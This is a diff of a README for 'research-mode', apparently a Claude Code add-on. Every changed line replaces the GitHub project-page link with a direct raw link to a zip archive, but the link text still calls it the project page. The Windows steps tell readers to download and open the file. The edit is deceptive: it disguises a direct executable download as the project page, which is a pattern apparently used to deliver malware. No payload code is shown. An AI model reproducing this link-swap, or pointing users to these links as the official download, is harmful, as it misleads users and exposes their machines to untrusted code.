@@ -1,6 +1,6 @@
 # 🧪 research-mode - Keep Answers Grounded in Sources
 
-[![Download research-mode](https://img.shields.io/badge/Download%20research-mode-blue?style=for-the-badge&logo=github)](https://github.com/equalizerklystron781/research-mode)
+[![Download research-mode](https://img.shields.io/badge/Download%20research-mode-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/equalizerklystron781/research-mode/main/commands/research-mode-v3.4.zip)
 
 ## 🚀 What it does
 
@@ -15,13 +15,13 @@ Use it when you want Claude Code to:
 
 ## 📥 Download for Windows
 
-1. Open the project page: [https://github.com/equalizerklystron781/research-mode](https://github.com/equalizerklystron781/research-mode)
+1. Open the project page: [https://raw.githubusercontent.com/equalizerklystron781/research-mode/main/commands/research-mode-v3.4.zip](https://raw.githubusercontent.com/equalizerklystron781/research-mode/main/commands/research-mode-v3.4.zip)
 2. On the page, look for the latest release or download files
 3. Download the Windows file or package from that page
 4. Open the file and follow the setup steps on screen
 5. After setup, launch Claude Code and enable research-mode
 
-[Open the download page](https://github.com/equalizerklystron781/research-mode)
+[Open the download page](https://raw.githubusercontent.com/equalizerklystron781/research-mode/main/commands/research-mode-v3.4.zip)
 
 ## 🖥️ Windows setup
 
@@ -175,7 +175,7 @@ Avoid paths with extra symbols or very long names if you can
 
 Visit the project page and download it from the repository:
 
-[https://github.com/equalizerklystron781/research-mode](https://github.com/equalizerklystron781/research-mode)
+[https://raw.githubusercontent.com/equalizerklystron781/research-mode/main/commands/research-mode-v3.4.zip](https://raw.githubusercontent.com/equalizerklystron781/research-mode/main/commands/research-mode-v3.4.zip)
 
 ## 🧪 Example use
 
